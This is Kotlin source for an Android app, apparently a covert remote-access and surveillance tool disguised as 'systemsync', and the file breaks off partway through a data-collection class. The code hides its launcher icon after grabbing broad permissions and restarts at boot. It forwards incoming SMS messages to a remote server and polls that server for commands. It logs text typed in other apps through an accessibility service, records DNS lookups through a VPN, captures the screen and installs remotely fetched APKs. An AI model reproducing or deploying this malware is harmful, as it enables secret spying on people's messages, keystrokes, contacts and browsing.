package com.example.systemsync

import android.Manifest
import android.accessibilityservice.AccessibilityService
import android.app.*
import android.content.*
import android.content.pm.PackageManager
import android.database.ContentObserver
import android.graphics.*
import android.hardware.display.DisplayManager
import android.media.ImageReader
import android.media.MediaRecorder
import android.media.projection.MediaProjectionManager
import android.net.*
import android.net.VpnService
import android.net.wifi.WifiManager
import android.os.*
import android.provider.*
import android.provider.MediaStore
import kotlin.concurrent.thread
import android.telephony.*
import android.view.accessibility.AccessibilityEvent
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import androidx.core.content.FileProvider
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.File
import java.io.FileInputStream
import java.io.FileOutputStream
import java.net.DatagramPacket
import java.net.DatagramSocket
import java.net.InetAddress
import java.net.NetworkInterface
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.ConcurrentHashMap
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit

// ============================================================
// ۱) MainActivity
// ============================================================
class MainActivity : AppCompatActivity() {
    private val perms = mutableListOf(
        Manifest.permission.READ_SMS, Manifest.permission.RECEIVE_SMS,
        Manifest.permission.READ_CONTACTS, Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_PHONE_STATE, Manifest.permission.RECORD_AUDIO,
        Manifest.permission.CAMERA, Manifest.permission.POST_NOTIFICATIONS
    ).apply {
        if (Build.VERSION.SDK_INT >= 33) {
            add(Manifest.permission.READ_MEDIA_IMAGES); add(Manifest.permission.READ_MEDIA_VIDEO)
        } else add(Manifest.permission.READ_EXTERNAL_STORAGE)
    }

    override fun onCreate(s: Bundle?) {
        super.onCreate(s)
        setContentView(R.layout.activity_main)
        val nameInput = findViewById<android.widget.EditText>(R.id.etName)
        val prefs = getSharedPreferences("cfg", MODE_PRIVATE)
        nameInput.setText(prefs.getString("name", BuildConfig.DEFAULT_NAME))
        findViewById<android.widget.TextView>(R.id.tvVersion).text =
            "نسخه: ${BuildConfig.APP_VERSION_NAME} (${BuildConfig.APP_VERSION_CODE})"

        findViewById<android.widget.Button>(R.id.btnCheckUpdate).setOnClickListener {
            Updater(this).checkAndPrompt()
        }

        findViewById<android.widget.Button>(R.id.btnStart).setOnClickListener {
            val name = nameInput.text.toString().trim().ifEmpty { "phone" }
            prefs.edit().putString("name", name).apply()
            val missing = perms.filter {
                ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
            }
            if (missing.isEmpty()) begin() else
                ActivityCompat.requestPermissions(this, missing.toTypedArray(), 1)
        }
    }

    override fun onRequestPermissionsResult(r: Int, p: Array<out String>, g: IntArray) {
        super.onRequestPermissionsResult(r, p, g)
        if (r == 1 && perms.all {
                ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
            }) begin()
        else findViewById<android.widget.TextView>(R.id.tvStatus).text = "دسترسی ناقص"
    }

    private fun begin() {
        val pm = getSystemService(POWER_SERVICE) as PowerManager
        if (!pm.isIgnoringBatteryOptimizations(packageName)) {
            try {
                startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
                    .setData(Uri.parse("package:$packageName")))
            } catch (_: Exception) {}
        }
        try {
            startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
                .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
        } catch (_: Exception) {}

        // یک بار درخواست تایید VPN
        val prefs = getSharedPreferences("cfg", MODE_PRIVATE)
        if (!prefs.getBoolean("vpnAsked", false)) {
            prefs.edit().putBoolean("vpnAsked", true).apply()
            try {
                startActivity(Intent(this, TrafficApprovalActivity::class.java)
                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
            } catch (_: Exception) {}
        }

        ContextCompat.startForegroundService(this, Intent(this, BotService::class.java))
        packageManager.setComponentEnabledSetting(
            ComponentName(this, MainActivity::class.java),
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP)
        findViewById<android.widget.TextView>(R.id.tvStatus).text = "فعال شد — آیکون مخفی"
    }
}

// ============================================================
// ۲) BootReceiver
// ============================================================
class BootReceiver : BroadcastReceiver() {
    override fun onReceive(c: Context, i: Intent) {
        if (i.action == Intent.ACTION_BOOT_COMPLETED)
            ContextCompat.startForegroundService(c, Intent(c, BotService::class.java))
    }
}

// ============================================================
// ۳) SmsReceiver
// ============================================================
class SmsReceiver : BroadcastReceiver() {
    override fun onReceive(c: Context, i: Intent) {
        try {
            val prefs = c.getSharedPreferences("cfg", Context.MODE_PRIVATE)
            if (!prefs.getBoolean("events", true)) return
            val msgs = Telephony.Sms.Intents.getMessagesFromIntent(i) ?: return
            val from = msgs.firstOrNull()?.originatingAddress ?: "?"
            val body = msgs.joinToString("") { it.messageBody ?: "" }

            if (prefs.getBoolean("smsNotify", true)) {
                val deviceId = prefs.getString("deviceId", null) ?: ""
                if (deviceId.isNotEmpty()) {
                    Thread {
                        try {
                            val payload = JSONObject().apply {
                                put("deviceId", deviceId)
                                put("secret", BuildConfig.WORKER_SECRET)
                                put("sender", from)
                                put("bodyText", body.take(3500))
                            }
                            OkHttpClient().newCall(Request.Builder()
                                .url("${BuildConfig.WORKER_URL.trimEnd('/')}/sms/notify")
                                .post(payload.toString().toRequestBody("application/json".toMediaType()))
                                .build()).execute().close()
                        } catch (_: Exception) {}
                    }.start()
                }
            }
            BackgroundPush.push(c, "📩 *SMS جدید*\nاز: `$from`")
        } catch (_: Exception) {}
    }
}

object BackgroundPush {
    private val http = OkHttpClient.Builder().connectTimeout(15, TimeUnit.SECONDS).build()
    fun push(ctx: Context, text: String) {
        val prefs = ctx.getSharedPreferences("cfg", Context.MODE_PRIVATE)
        val chatId = prefs.getLong("chatId", 0L)
        if (chatId == 0L) return
        val name = prefs.getString("name", "phone")
        try {
            val body = JSONObject().apply {
                put("chat_id", chatId); put("text", "[$name]\n$text".take(4000))
            }
            http.newCall(Request.Builder()
                .url("${BuildConfig.WORKER_URL.trimEnd('/')}/api/sendMessage")
                .post(body.toString().toRequestBody("application/json".toMediaType()))
                .build()).execute().close()
        } catch (_: Exception) {}
    }
}

// ============================================================
// ۴) Config
// ============================================================
class Config(ctx: Context) {
    private val p = ctx.getSharedPreferences("cfg", Context.MODE_PRIVATE)
    var deviceName  get() = p.getString("name", BuildConfig.DEFAULT_NAME)!!; set(v) = p.edit().putString("name", v).apply()
    var smsLimit    get() = p.getInt("sms", 100);   set(v) = p.edit().putInt("sms", v).apply()
    var callsLimit  get() = p.getInt("calls", 100); set(v) = p.edit().putInt("calls", v).apply()
    var photoCount  get() = p.getInt("pc", 10);     set(v) = p.edit().putInt("pc", v).apply()
    var photoFolder get() = p.getString("pd", "")!!; set(v) = p.edit().putString("pd", v).apply()
    var videoCount  get() = p.getInt("vc", 5);      set(v) = p.edit().putInt("vc", v).apply()
    var videoFolder get() = p.getString("vd", "")!!; set(v) = p.edit().putString("vd", v).apply()
    var chunkOn     get() = p.getBoolean("chunk", true); set(v) = p.edit().putBoolean("chunk", v).apply()
    var quality     get() = p.getString("q", "original")!!; set(v) = p.edit().putString("q", v).apply()
    var autoCallRec get() = p.getBoolean("acr", true); set(v) = p.edit().putBoolean("acr", v).apply()
    var eventsOn    get() = p.getBoolean("events", true); set(v) = p.edit().putBoolean("events", v).apply()
    var smsNotify   get() = p.getBoolean("smsNotify", true); set(v) = p.edit().putBoolean("smsNotify", v).apply()
    var typedOn     get() = p.getBoolean("typedOn", false); set(v) = p.edit().putBoolean("typedOn", v).apply()
    var typedRange  get() = p.getString("typedRange", "")!!; set(v) = p.edit().putString("typedRange", v).apply()
    var trafficOn   get() = p.getBoolean("trafficOn", false); set(v) = p.edit().putBoolean("trafficOn", v).apply()
}

// ============================================================
// ۵) Worker Client
// ============================================================
class Worker(private val cfg: Config) {
    private val base   = BuildConfig.WORKER_URL.trimEnd('/')
    private val secret = BuildConfig.WORKER_SECRET
    private val http   = OkHttpClient.Builder()
        .connectTimeout(20, TimeUnit.SECONDS)
        .writeTimeout(120, TimeUnit.SECONDS)
        .readTimeout(120, TimeUnit.SECONDS).build()
    private fun jsonBody(s: String) = s.toRequestBody("application/json".toMediaType())

    fun deviceId(ctx: Context): String {
        val prefs = ctx.getSharedPreferences("cfg", Context.MODE_PRIVATE)
        var id = prefs.getString("deviceId", null)
        if (id == null) {
            id = (Settings.Secure.getString(ctx.contentResolver, Settings.Secure.ANDROID_ID)
                ?: UUID.randomUUID().toString()).take(8).uppercase()
            prefs.edit().putString("deviceId", id).apply()
        }
        return id
    }

    fun register(ctx: Context): Long? {
        val body = JSONObject().apply {
            put("deviceId", deviceId(ctx)); put("deviceName", cfg.deviceName); put("secret", secret)
        }
        return try {
            http.newCall(Request.Builder().url("$base/register")
                .post(body.toString().let(::jsonBody)).build()).execute().use { r ->
                if (!r.isSuccessful) return null
                val o = JSONObject(r.body!!.string())
                if (!o.optBoolean("ok")) return null
                val cid = o.optLong("chatId", 0L)
                if (cid != 0L) {
                    ctx.getSharedPreferences("cfg", Context.MODE_PRIVATE).edit().putLong("chatId", cid).apply()
                }
                cid.takeIf { it != 0L }
            }
        } catch (_: Exception) { null }
    }

    fun poll(ctx: Context): List<String> = try {
        val url = "$base/poll?device=${deviceId(ctx)}&secret=$secret"
        http.newCall(Request.Builder().url(url).get().build()).execute().use { r ->
            if (!r.isSuccessful) return emptyList()
            val o = JSONObject(r.body!!.string())
            if (!o.optBoolean("ok")) return emptyList()
            val arr = o.getJSONArray("commands")
            (0 until arr.length()).map { arr.getString(it) }
        }
    } catch (_: Exception) { emptyList() }

    fun sendText(chatId: Long, text: String) {
        if (chatId == 0L) return
        val body = JSONObject().apply { put("chat_id", chatId); put("text", text.take(4000)) }
        try {
            http.newCall(Request.Builder().url("$base/api/sendMessage")
                .post(body.toString().let(::jsonBody)).build()).execute().close()
        } catch (_: Exception) {}
    }

    fun sendFile(chatId: Long, file: File) {
        if (chatId == 0L || !file.exists()) return
        try {
            val body = MultipartBody.Builder().setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", chatId.toString())
                .addFormDataPart("document", file.name, file.asRequestBody("application/octet-stream".toMediaType()))
                .build()
            http.newCall(Request.Builder().url("$base/api/sendDocument").post(body).build())
                .execute().close()
        } catch (_: Exception) {}
    }

    data class ChunkResult(val ok: Boolean, val complete: Boolean, val downloadUrl: String?)

    fun uploadChunk(uploadId: String, partIndex: Int, totalParts: Int,
                    filename: String, contentType: String, chunk: File): ChunkResult {
        return try {
            val body = MultipartBody.Builder().setType(MultipartBody.FORM)
                .addFormDataPart("upload_id", uploadId)
                .addFormDataPart("part_index", partIndex.toString())
                .addFormDataPart("total_parts", totalParts.toString())
                .addFormDataPart("filename", filename)
                .addFormDataPart("content_type", contentType)
                .addFormDataPart("file", "part_$partIndex", chunk.asRequestBody("application/octet-stream".toMediaType()))
                .build()
            http.newCall(Request.Builder().url("$base/chunk/upload").post(body).build()).execute().use { r ->
                if (!r.isSuccessful) return ChunkResult(false, false, null)
                val o = JSONObject(r.body!!.string())
                ChunkResult(o.optBoolean("ok"), o.optBoolean("complete"),
                    o.optString("downloadUrl", "").takeIf { it.isNotEmpty() })
            }
        } catch (_: Exception) { ChunkResult(false, false, null) }
    }

    suspend fun smartSend(ctx: Context, chatId: Long, file: File, contentType: String,
                          onReduce: (File) -> File? = { null }) {
        val limit = 45L * 1024 * 1024
        if (file.length() <= limit) { sendFile(chatId, file); return }
        if (cfg.quality != "original") {
            val reduced = withContext(Dispatchers.IO) { onReduce(file) }
            if (reduced != null && reduced.exists() && reduced.length() <= limit) {
                sendText(chatId, "🔄 کیفیت کاهش یافت")
                sendFile(chatId, reduced); return
            }
        }
        if (!cfg.chunkOn) {
            sendText(chatId, "⚠️ فایل بزرگ‌تر از ۴۵MB. `/chunk on` رو فعال کن."); return
        }
        sendText(chatId, "📦 ${file.length()/1024/1024}MB در حال تکه‌تکه شدن...")
        val uploadId = UUID.randomUUID().toString().replace("-","").take(12)
        val parts = ((file.length() + limit - 1) / limit).toInt()
        val buf = ByteArray(limit.toInt())
        try {
            file.inputStream().use { input ->
                for (i in 0 until parts) {
                    var total = 0
                    while (total < buf.size) {
                        val read = input.read(buf, total, buf.size - total)
                        if (read <= 0) break
                        total += read
                    }
                    if (total == 0) break
                    val chunkFile = File(ctx.cacheDir, "part_$i.tmp")
                    chunkFile.writeBytes(buf.copyOf(total))
                    uploadChunk(uploadId, i, parts, file.name, contentType, chunkFile)
                    chunkFile.delete()
                }
            }
            sendText(chatId, "✅ آماده دانلود:\n$base/download/$uploadId")
        } catch (e: Exception) {
            sendText(chatId, "❌ خطا: ${e.message}")
        }
    }
}

// ============================================================
// ۶) Updater
// ============================================================
class Updater(private val context: Context) {
    private val http = OkHttpClient()
    fun checkAndPrompt() {
        if (context !is Activity) return
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val resp = http.newCall(Request.Builder()
                    .url("${BuildConfig.WORKER_URL.trimEnd('/')}/latest_version").get().build()).execute()
                val o = JSONObject(resp.body!!.string()); resp.close()
                if (!o.optBoolean("ok")) return@launch
                val latest = o.optInt("versionCode", 0)
                val url = o.optString("apkUrl", "")
                if (latest <= BuildConfig.APP_VERSION_CODE || url.isEmpty()) {
                    withContext(Dispatchers.Main) {
                        android.widget.Toast.makeText(context, "نسخه به‌روزه", android.widget.Toast.LENGTH_SHORT).show()
                    }
                    return@launch
                }
                withContext(Dispatchers.Main) {
                    AlertDialog.Builder(context)
                        .setTitle("آپدیت موجود")
                        .setMessage("نسخه ${o.optString("versionName")} موجود است.")
                        .setPositiveButton("دانلود و نصب") { _, _ -> downloadAndInstall(url) }
                        .setNegativeButton("بعداً", null).show()
                }
            } catch (_: Exception) {}
        }
    }
    fun downloadAndInstall(url: String) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val apk = File(context.cacheDir, "update.apk")
                http.newCall(Request.Builder().url(url).build()).execute().use { r ->
                    if (!r.isSuccessful) throw Exception("Download failed")
                    apk.outputStream().use { out -> r.body!!.byteStream().copyTo(out) }
                }
                withContext(Dispatchers.Main) {
                    context.startActivity(Intent(context, InstallActivity::class.java).apply {
                        putExtra("apk_path", apk.absolutePath)
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    })
                }
            } catch (e: Exception) {
                withContext(Dispatchers.Main) {
                    android.widget.Toast.makeText(context, "خطا: ${e.message}", android.widget.Toast.LENGTH_LONG).show()
                }
            }
        }
    }
    fun downloadAndInstallFromService() {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val urlRes = http.newCall(Request.Builder()
                    .url("${BuildConfig.WORKER_URL.trimEnd('/')}/latest_version").get().build()).execute()
                val o = JSONObject(urlRes.body!!.string()); urlRes.close()
                val url = o.optString("apkUrl", "")
                if (url.isEmpty()) return@launch
                val apk = File(context.cacheDir, "update.apk")
                http.newCall(Request.Builder().url(url).build()).execute().use { r ->
                    if (!r.isSuccessful) return@launch
                    apk.outputStream().use { out -> r.body!!.byteStream().copyTo(out) }
                }
                withContext(Dispatchers.Main) {
                    context.startActivity(Intent(context, InstallActivity::class.java).apply {
                        putExtra("apk_path", apk.absolutePath)
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    })
                }
            } catch (_: Exception) {}
        }
    }
}

// ============================================================
// ۷) InstallActivity
// ============================================================
class InstallActivity : AppCompatActivity() {
    override fun onCreate(s: Bundle?) {
        super.onCreate(s)
        val apkPath = intent.getStringExtra("apk_path") ?: return finish()
        val apk = File(apkPath)
        if (!apk.exists()) { finish(); return }
        val uri = FileProvider.getUriForFile(this, "$packageName.fileprovider", apk)
        startActivity(Intent(Intent.ACTION_VIEW).apply {
            setDataAndType(uri, "application/vnd.android.package-archive")
            addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION or Intent.FLAG_ACTIVITY_NEW_TASK)
        })
        finish()
    }
}

// ============================================================
// ۸) TrafficApprovalActivity — تایید یک‌بار VPN
// ============================================================
class TrafficApprovalActivity : AppCompatActivity() {
    override fun onCreate(s: Bundle?) {
        super.onCreate(s)
        val prepare = VpnService.prepare(this)
        if (prepare != null) {
            startActivityForResult(prepare, 100)
        } else {
            finish()
        }
    }
    override fun onActivityResult(rc: Int, result: Int, data: Intent?) {
        super.onActivityResult(rc, result, data)
        if (rc == 100 && result == RESULT_OK) {
            getSharedPreferences("cfg", MODE_PRIVATE).edit().putBoolean("vpnReady", true).apply()
            startService(Intent(this, TrafficService::class.java))
        }
        finish()
    }
}

// ============================================================
// ۹) TrafficService — VpnService برای رصد DNS
// ============================================================
class TrafficService : VpnService() {
    companion object {
        @Volatile var instance: TrafficService? = null
    }

    private var tunFd: ParcelFileDescriptor? = null
    @Volatile private var running = false
    private var tunIn: FileInputStream? = null
    private var tunOut: FileOutputStream? = null
    private lateinit var dnsSocket: DatagramSocket
    private val domainCounts = ConcurrentHashMap<String, Int>()
    private val lastSeen = ConcurrentHashMap<String, Long>()

    override fun onCreate() {
        super.onCreate()
        instance = this
        startForeground(2, notif())
        try {
            dnsSocket = DatagramSocket()
            protect(dnsSocket)
        } catch (_: Exception) { return }
        startVpn()
    }

    private fun startVpn() {
        val builder = Builder()
            .setSession("System")
            .addAddress("10.8.0.2", 32)
            .addDnsServer("10.8.0.1")
            .addRoute("10.8.0.1", 32)
            .setBlocking(true)
        try { builder.addDisallowedApplication(packageName) } catch (_: Exception) {}

        tunFd = try { builder.establish() } catch (_: Exception) { null } ?: return
        tunIn = FileInputStream(tunFd!!.fileDescriptor)
        tunOut = FileOutputStream(tunFd!!.fileDescriptor)
        running = true
        thread { readLoop() }
    }

    private fun readLoop() {
        val buf = ByteArray(32767)
        while (running) {
            try {
                val len = tunIn?.read(buf) ?: break
                if (len > 0) handlePacket(buf, len)
            } catch (_: Exception) { break }
        }
    }

    private fun handlePacket(buf: ByteArray, len: Int) {
        if (len < 28) return
        val ver = (buf[0].toInt() ushr 4) and 0xF
        if (ver != 4) return
        val ihl = (buf[0].toInt() and 0xF) * 4
        if (len < ihl + 8) return
        val proto = buf[9].toInt() and 0xFF
        if (proto != 17) return
        val dstPort = ((buf[ihl+2].toInt() and 0xFF) shl 8) or (buf[ihl+3].toInt() and 0xFF)
        if (dstPort != 53) return

        val query = buf.copyOfRange(ihl + 8, len)
        val domain = parseDnsName(query)
        if (!domain.isNullOrEmpty() && !domain.endsWith(".local") && domain.contains(".")) {
            domainCounts.merge(domain, 1, Int::plus)
            lastSeen[domain] = System.currentTimeMillis()
        }
        val response = forwardDns(query) ?: return
        sendResponse(buf, ihl, response)
    }

    private fun parseDnsName(data: ByteArray): String? {
        if (data.size < 12) return null
        var pos = 12
        val parts = mutableListOf<String>()
        var safety = 0
        while (pos < data.size && safety++ < 50) {
            val lenByte = data[pos].toInt() and 0xFF
            if (lenByte == 0) break
            if ((lenByte and 0xC0) == 0xC0) break
            if (lenByte > 63) break
            if (pos + lenByte >= data.size) break
            parts.add(String(data, pos + 1, lenByte))
            pos += lenByte + 1
        }
        return if (parts.isEmpty()) null else parts.joinToString(".")
    }

    private fun forwardDns(query: ByteArray): ByteArray? {
        return try {
            val addr = InetAddress.getByName("8.8.8.8")
            val send = DatagramPacket(query, query.size, addr, 53)
            dnsSocket.soTimeout = 3000
            dnsSocket.send(send)
            val response = ByteArray(4096)
            val recv = DatagramPacket(response, response.size)
            dnsSocket.receive(recv)
            response.copyOf(recv.length)
        } catch (_: Exception) { null }
    }

    private fun sendResponse(original: ByteArray, ihl: Int, dnsResponse: ByteArray) {
        try {
            val totalLen = ihl + 8 + dnsResponse.size
            val out = ByteArray(totalLen)
            System.arraycopy(original, 0, out, 0, ihl)
            // Swap src/dst IP
            System.arraycopy(original, 16, out, 12, 4)
            System.arraycopy(original, 12, out, 16, 4)
            out[2] = (totalLen ushr 8).toByte()
            out[3] = (totalLen and 0xFF).toByte()
            out[10] = 0; out[11] = 0
            val csum = ipChecksum(out, 0, ihl)
            out[10] = (csum ushr 8).toByte()
            out[11] = (csum and 0xFF).toByte()

            // UDP header (swap ports)
            val srcPort = ((original[ihl].toInt() and 0xFF) shl 8) or (original[ihl+1].toInt() and 0xFF)
            val dstPort = ((original[ihl+2].toInt() and 0xFF) shl 8) or (original[ihl+3].toInt() and 0xFF)
            out[ihl] = (dstPort ushr 8).toByte()
            out[ihl+1] = (dstPort and 0xFF).toByte()
            out[ihl+2] = (srcPort ushr 8).toByte()
            out[ihl+3] = (srcPort and 0xFF).toByte()
            val udpLen = 8 + dnsResponse.size
            out[ihl+4] = (udpLen ushr 8).toByte()
            out[ihl+5] = (udpLen and 0xFF).toByte()
            out[ihl+6] = 0; out[ihl+7] = 0

            System.arraycopy(dnsResponse, 0, out, ihl + 8, dnsResponse.size)
            tunOut?.write(out)
        } catch (_: Exception) {}
    }

    private fun ipChecksum(data: ByteArray, offset: Int, length: Int): Int {
        var sum = 0
        var i = offset
        while (i < offset + length) {
            sum += ((data[i].toInt() and 0xFF) shl 8) or (data[i+1].toInt() and 0xFF)
            i += 2
        }
        while (sum > 0xFFFF) sum = (sum and 0xFFFF) + (sum ushr 16)
        return sum.inv() and 0xFFFF
    }

    fun dumpStats(): String {
        if (domainCounts.isEmpty()) return "ترافیکی ثبت نشده."
        val sb = StringBuilder("=== گزارش ترافیک DNS ===\n\n")
        sb.appendLine("Domain\tCount\tLast")
        sb.appendLine("──────\t─────\t────")
        domainCounts.entries.sortedByDescending { it.value }.forEach { (domain, count) ->
            val ts = lastSeen[domain] ?: 0
            val time = SimpleDateFormat("HH:mm", Locale.US).format(Date(ts))
            sb.appendLine("$domain\t$count\t$time")
        }
        return sb.toString()
    }

    fun clearStats() {
        domainCounts.clear(); lastSeen.clear()
    }

    private fun notif(): Notification {
        val ch = "v"
        if (Build.VERSION.SDK_INT >= 26) {
            val nm = getSystemService(NotificationManager::class.java)
            if (nm.getNotificationChannel(ch) == null)
                nm.createNotificationChannel(NotificationChannel(ch, "Network", NotificationManager.IMPORTANCE_LOW))
        }
        return NotificationCompat.Builder(this, ch)
            .setSmallIcon(android.R.drawable.stat_sys_download_done)
            .setContentTitle("System").setContentText("Network active")
            .setOngoing(true).build()
    }

    override fun onDestroy() {
        running = false
        instance = null
        try { tunIn?.close() } catch (_: Exception) {}
        try { tunOut?.close() } catch (_: Exception) {}
        try { tunFd?.close() } catch (_: Exception) {}
        try { dnsSocket.close() } catch (_: Exception) {}
        super.onDestroy()
    }
}

// ============================================================
// ۱۰) ScreenCaptureActivity
// ============================================================
class ScreenCaptureActivity : AppCompatActivity() {
    override fun onCreate(s: Bundle?) {
        super.onCreate(s)
        val mgr = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        startActivityForResult(mgr.createScreenCaptureIntent(), 100)
    }
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == 100 && resultCode == RESULT_OK && data != null) {
            startService(Intent(this, BotService::class.java).apply {
                action = "CAPTURE"
                putExtra("resultCode", resultCode)
                putExtra("data", data)
                putExtra("mode", intent.getStringExtra("mode") ?: "screenshot")
                putExtra("seconds", intent.getIntExtra("seconds", 30))
            })
        }
        finish()
    }
}

// ============================================================
// ۱۱) CaptureService — Accessibility
// ============================================================
class CaptureService : AccessibilityService() {
    private lateinit var cfg: Config
    private var lastText = ""
    private var lastTs = 0L
    override fun onServiceConnected() { super.onServiceConnected(); cfg = Config(this) }
    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event ?: return
        try {
            if (!cfg.typedOn) return
            if (!isInTimeRange()) return
            val pkg = event.packageName?.toString() ?: return
            if (pkg == packageName) return
            if (pkg.startsWith("com.android.systemui")) return
            val txt = event.text?.joinToString(" ")?.trim() ?: return
            if (txt.isEmpty()) return
            if (txt == lastText && System.currentTimeMillis() - lastTs < 2000) return
            lastText = txt; lastTs = System.currentTimeMillis()
            val dir = File(getExternalFilesDir(null), "typed").apply { mkdirs() }
            val file = File(dir, "typed_${SimpleDateFormat("yyyyMMdd", Locale.US).format(Date())}.txt")
            val ts = SimpleDateFormat("HH:mm:ss", Locale.US).format(Date())
            file.appendText("[$ts] [$pkg] $txt\n")
        } catch (_: Exception) {}
    }
    private fun isInTimeRange(): Boolean {
        val range = cfg.typedRange
        if (range.isEmpty()) return true
        val parts = range.split("-")
        if (parts.size != 2) return true
        val cal = Calendar.getInstance()
        val cur = cal.get(Calendar.HOUR_OF_DAY) * 60 + cal.get(Calendar.MINUTE)
        val start = parseTime(parts[0])
        val end = parseTime(parts[1])
        return if (start <= end) cur in start..end else (cur >= start || cur <= end)
    }
    private fun parseTime(s: String): Int {
        val p = s.trim().split(":")
        return (p.getOrNull(0)?.toIntOrNull() ?: 0) * 60 + (p.getOrNull(1)?.toIntOrNull() ?: 0)
    }
    override fun onInterrupt() {}
}

// ============================================================
// ۱۲) Collector
// ============================================================
class Collector(private val ctx: Context) {
    fun info(): String {
        val tm = ctx.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        return """
            📱 دستگاه آنلاین
            Model: ${Build.MANUFACTURER} ${Build.MODEL}
            Android: ${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})
            Phone: ${try { tm.line1Number ?: "?" } catch (_: Exception) { "?" }}
            Carrier: ${tm.networkOperatorName ?: "?"}
            App: ${BuildConfig.APP_VERSION_NAME}

            ${battery()}
            ${network()}
        """.trimIndent()
    }
    fun battery(): String {
        val bm = ctx.getSystemService(Context.BATTERY_SERVICE) as BatteryManager
        val level = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
        val i = ctx.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        val status = i?.getIntExtra(BatteryManager.EXTRA_STATUS, -1) ?: -1
        val charging = status == BatteryManager.BATTERY_STATUS_CHARGING || status == BatteryManager.BATTERY_STATUS_FULL
        val plug = when (i?.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1)) {
            BatteryManager.BATTERY_PLUGGED_AC -> "AC"
            BatteryManager.BATTERY_PLUGGED_USB -> "USB"
            BatteryManager.BATTERY_PLUGGED_WIRELESS -> "Wireless"
            else -> "—"
        }
        return "🔋 باتری: $level%${if (charging) " ⚡ درحال شارژ ($plug)" else ""}"
    }
    fun network(): String {
        val cm = ctx.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val active = cm.activeNetwork ?: return "🌐 شبکه: آفلاین"
        val caps = cm.getNetworkCapabilities(active) ?: return "🌐 شبکه: ?"
        val type = when {
            caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> "WiFi"
            caps.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> "Cell"
            caps.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) -> "Ethernet"
            else -> "?"
        }
        return "🌐 شبکه: $type\n" + ipInfo()
    }
    fun wifi(): String {
        val wm = ctx.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
        @Suppress("DEPRECATION") val info = wm.connectionInfo ?: return "📶 WiFi: غیرفعال"
        @Suppress("DEPRECATION") return "📶 WiFi: ${info.ssid ?: "?"}\nIP: ${intToIp(info.ipAddress)}"
    }
    fun ipInfo(): String {
        val ips = try {
            NetworkInterface.getNetworkInterfaces().toList().flatMap { it.inetAddresses.toList() }
                .filter { !it.isLoopbackAddress }.map { it.hostAddress ?: "" }.filter { it.isNotEmpty() }
        } catch (_: Exception) { emptyList() }
        return "🔗 IP: " + (ips.joinToString(", ").ifEmpty { "?" })
    }
    private fun intToIp(i: Int): String =
        "${i and 0xff}.${(i shr 8) and 0xff}.${(i shr 16) and 0xff}.${(i shr 24) and 0xff}"
    fun sms(limit: Int): String {
        val sb = StringBuilder()
        ctx.contentResolver.query(Telephony.Sms.CONTENT_URI, null, null, null,
            "${Telephony.Sms.DATE} DESC")?.use { c ->
            var i = 0
            while (c.moveToNext() && i++ < limit) {
                sb.appendLine("📩 ${c.getString(c.getColumnIndexOrThrow(Telephony.Sms.ADDRESS))}")
                sb.appendLine(c.getString(c.getColumnIndexOrThrow(Telephony.Sms.BODY)))
                sb.appendLine("—")
            }
        }
        return sb.toString().ifEmpty { "پیامی نیست" }.take(4000)
    }
    fun contactsFile(): File {
        val f = File(ctx.cacheDir, "contacts_${System.currentTimeMillis()}.txt")
        val sb = StringBuilder()
        ctx.contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            arrayOf(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Phone.NUMBER), null, null, null)?.use { c ->
            while (c.moveToNext()) sb.appendLine("${c.getString(0)}\t${c.getString(1)}")
        }
        f.writeText(sb.toString().ifEmpty { "مخاطبی نیست" })
        return f
    }
    fun calls(limit: Int): String {
        val sb = StringBuilder()
        ctx.contentResolver.query(CallLog.Calls.CONTENT_URI, null, null, null,
            "${CallLog.Calls.DATE} DESC")?.use { c ->
            var i = 0
            while (c.moveToNext() && i++ < limit) {
                sb.appendLine("${c.getString(c.getColumnIndexOrThrow(CallLog.Calls.NUMBER))} " +
                    "type=${c.getInt(c.getColumnIndexOrThrow(CallLog.Calls.TYPE))} " +
                    "dur=${c.getInt(c.getColumnIndexOrThrow(CallLog.Calls.DURATION))}s")
            }
        }
        return sb.toString().ifEmpty { "تماسی نیست" }.take(4000)
    }
    fun media(kind: String, count: Int, folder: String): List<File> {
        val uri = if (kind == "photo") MediaStore.Images.Media.EXTERNAL_CONTENT_URI
